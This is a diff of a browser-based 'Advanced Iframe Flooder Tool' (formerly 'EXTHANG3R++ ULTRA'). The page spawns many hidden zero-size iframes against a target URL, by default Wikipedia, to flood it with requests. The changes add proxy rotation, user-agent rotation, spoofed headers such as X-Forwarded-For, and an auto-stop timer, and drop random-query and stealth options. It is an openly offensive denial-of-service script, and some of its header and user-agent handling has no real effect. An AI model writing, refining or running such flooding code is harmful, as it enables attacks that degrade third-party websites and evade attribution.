@@ -3,24 +3,22 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>EXTHANG3R++ ULTRA</title>
+  <title>Advanced Iframe Flooder Tool</title>
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
   <style>
     body {
       font-family: 'Arial', sans-serif;
       margin: 0;
       padding: 0;
-      background: #121212;
-      color: #00FF00;
+      background: #2e3b4e;
+      color: #fff;
       overflow-x: hidden;
     }
-
     h1 {
       text-align: center;
-      color: #00FF00;
+      color: #4CAF50;
       margin-top: 20px;
-      font-size: 2em;
     }
-
     .container {
       width: 90%;
       max-width: 900px;
@@ -28,64 +26,74 @@
       background: #333;
       padding: 20px;
       border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
       box-sizing: border-box;
     }
-
     .container label {
       font-weight: bold;
       margin-top: 10px;
       display: block;
     }
-
     input, button, textarea {
       width: 100%;
       padding: 12px;
       margin-top: 10px;
       font-size: 16px;
       border-radius: 5px;
-      border: 1px solid #888;
+      border: 1px solid #ccc;
     }
-
     button {
-      background-color: #00FF00;
+      background-color: #4CAF50;
       color: white;
       border: none;
       cursor: pointer;
       margin-top: 15px;
     }
-
     button.stop {
-      background-color: #FF4444;
+      background-color: #f44336;
     }
-
     button:hover {
       opacity: 0.9;
     }
-
     .status {
       text-align: center;
       font-weight: bold;
-      color: #00FF00;
+      color: #4CAF50;
       margin-top: 20px;
     }
-
     .error {
-      color: #FF4444;
+      color: #f44336;
       font-weight: bold;
     }
-
-    .stats {
-      margin-top: 15px;
-      color: #00FF00;
+    #iframeContainer {
+      display: none;
     }
-
+    #dashboard {
+      background-color: #f1f1f1;
+      padding: 15px;
+      border-radius: 5px;
+      margin-top: 20px;
+    }
+    .stats {
+      margin: 5px 0;
+    }
+    .stats span {
+      font-weight: bold;
+    }
+    .tooltip {
+      position: absolute;
+      background-color: #f9f9f9;
+      border: 1px solid #ccc;
+      padding: 5px;
+      font-size: 12px;
+      display: none;
+      border-radius: 4px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
     .input-group {
       position: relative;
       margin-bottom: 15px;
     }
-    
-    /* Responsive Design */
     @media (max-width: 768px) {
       .container {
         width: 100%;
@@ -96,70 +104,49 @@
 </head>
 <body>
 
-  <h1>EXTHANG3R++ ULTRA</h1>
+  <h1>Advanced Iframe Flooder Tool</h1>
 
   <div class="container">
-    <!-- Target URL -->
     <div class="input-group">
       <label for="targetUrl">Target URL:</label>
       <input type="text" id="targetUrl" value="https://www.wikipedia.org" placeholder="Enter Target URL">
     </div>
 
-    <!-- Number of Iframes -->
     <div class="input-group">
       <label for="iframeCount">Number of Iframes:</label>
       <input type="number" id="iframeCount" value="50" min="1">
     </div>
 
-    <!-- Delay Between Iframes -->
     <div class="input-group">
-      <label for="delay">Delay Between Iframes (ms):</label>
-      <input type="number" id="delay" value="1000" min="0">
+      <label for="delay">Delay Between Iframes (seconds):</label>
+      <input type="number" id="delay" value="1" min="0">
     </div>
 
-    <!-- Random Subdomain -->
     <div class="input-group">
-      <label for="randomSubdomain">Enable Random Subdomain:</label>
-      <input type="checkbox" id="randomSubdomain">
+      <label for="proxyList">Proxy List (comma separated):</label>
+      <input type="text" id="proxyList" placeholder="http://proxy1.com, http://proxy2.com">
     </div>
 
-    <!-- Random Query -->
-    <div class="input-group">
-      <label for="randomQuery">Enable Random Query Strings:</label>
-      <input type="checkbox" id="randomQuery">
-    </div>
-
-    <!-- High Memory Mode -->
-    <div class="input-group">
-      <label for="highMemory">Enable High Memory Mode:</label>
-      <input type="checkbox" id="highMemory">
-    </div>
-
-    <!-- Stealth Mode -->
-    <div class="input-group">
-      <label for="stealthMode">Enable Stealth Mode:</label>
-      <input type="checkbox" id="stealthMode">
-    </div>
-
-    <!-- User-Agent Rotation -->
     <div class="input-group">
       <label for="userAgentRotation">Enable User-Agent Rotation:</label>
       <input type="checkbox" id="userAgentRotation">
     </div>
 
-    <!-- Auto Stop Timer -->
     <div class="input-group">
-      <label for="autoStopTimer">Auto Stop Timer (s):</label>
+      <label for="headers">Custom Headers (Optional):</label>
+      <textarea id="headers" placeholder="e.g., X-Forwarded-For: 192.168.1.1"></textarea>
+    </div>
+
+    <div class="input-group">
+      <label for="autoStopTimer">Auto Stop Timer (seconds):</label>
       <input type="number" id="autoStopTimer" value="60" min="0">
     </div>
 
-    <!-- Start/Stop Buttons -->
     <button onclick="startFlood()">Start Flooding</button>
     <button class="stop" onclick="stopFlood()">Stop Flooding</button>
 
     <div class="status" id="status">Ready</div>
 
-    <!-- Stats Dashboard -->
     <div id="dashboard">
       <h3>Flooding Stats</h3>
       <p class="stats">Frames Generated: <span id="frameCount">0</span></p>
@@ -175,57 +162,23 @@
     let currentTarget = '';
     let proxyList = [];
     let userAgentRotation = false;
-    let targetRotation = [];
     let currentProxyIndex = 0;
-    let currentTargetIndex = 0;
 
-    // Tooltip visibility
-    document.querySelectorAll('.input-group').forEach(group => {
-      group.addEventListener('mouseover', () => {
-        group.querySelector('.tooltip').style.display = 'block';
-      });
-      group.addEventListener('mouseout', () => {
-        group.querySelector('.tooltip').style.display = 'none';
-      });
-    });
-
-    // Proxy fetch function
-    async function fetchProxies() {
-      try {
-        const response = await fetch('https://www.proxy-list.download/api/v1/get?type=https');
-        const data = await response.text();
-        proxyList = data.split('\r\n');
-      } catch (error) {
-        console.error('Failed to fetch proxies, using default:', error);
-        proxyList = [
-          'http://proxy1.com', 'http://proxy2.com', 'http://proxy3.com'
-        ]; // Default proxies
-      }
-      console.log('Proxies Loaded:', proxyList);
-    }
-
-    // Random proxy getter
-    function getRandomProxy() {
-      return proxyList[Math.floor(Math.random() * proxyList.length)];
-    }
-
-    // Start flooding
     function startFlood() {
       if (flooding) return;
       flooding = true;
       document.getElementById('status').innerText = "Flooding in progress...";
 
       currentTarget = document.getElementById('targetUrl').value;
-      targetRotation = document.getElementById('targetRotation').value.split(',');
-      fetchProxies();
+      proxyList = document.getElementById('proxyList').value.split(',');
+      userAgentRotation = document.getElementById('userAgentRotation').checked;
 
       const customHeaders = document.getElementById('headers').value.split('\n').map(line => line.trim());
-      const delay = parseInt(document.getElementById('delay').value);
+      const delay = parseInt(document.getElementById('delay').value) * 1000;
 
       floodIframes(currentTarget, delay, customHeaders);
     }
 
-    // Flooding logic
     function floodIframes(target, delay, customHeaders) {
       const iframeCount = parseInt(document.getElementById('iframeCount').value);
       for (let i = 0; i < iframeCount; i++) {
@@ -235,19 +188,21 @@
           document.getElementById('frameCount').innerText = frameCount;
         }, delay * i);
       }
+
+      const autoStopTime = parseInt(document.getElementById('autoStopTimer').value) * 1000;
+      if (autoStopTime > 0) {
+        setTimeout(stopFlood, autoStopTime);
+      }
     }
 
-    // Load iframe with random proxy and headers
     function loadIframe(target, customHeaders) {
       const iframe = document.createElement('iframe');
       iframe.src = target;
       iframe.style.width = "0";
       iframe.style.height = "0";
       iframe.style.border = "none";
-      
-      const proxy = getRandomProxy();
-      iframe.src = `${proxy}${target}`;
 
+      // Apply custom headers if provided
       customHeaders.forEach(header => {
         const [key, value] = header.split(':');
         if (key && value) {
@@ -255,16 +210,33 @@
         }
       });
 
+      // Proxy rotation and user-agent rotation
+      let proxy = proxyList[currentProxyIndex % proxyList.length];
+      if (userAgentRotation) {
+        let randomUserAgent = getRandomUserAgent();
+        iframe.setAttribute('User-Agent', randomUserAgent);
+      }
+
+      iframe.setAttribute('src', proxy + '/' + target);
       document.body.appendChild(iframe);
-      currentTargetIndex++;
-      document.getElementById('currentTarget').innerText = currentTarget;
+      currentProxyIndex++;
+      document.getElementById('currentTarget').innerText = target;
     }
 
-    // Stop flooding
+    function getRandomUserAgent() {
+      const userAgents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
+      ];
+      return userAgents[Math.floor(Math.random() * userAgents.length)];
+    }
+
     function stopFlood() {
       flooding = false;
       document.getElementById('status').innerText = "Flooding stopped.";
     }
   </script>
+
 </body>
 </html>
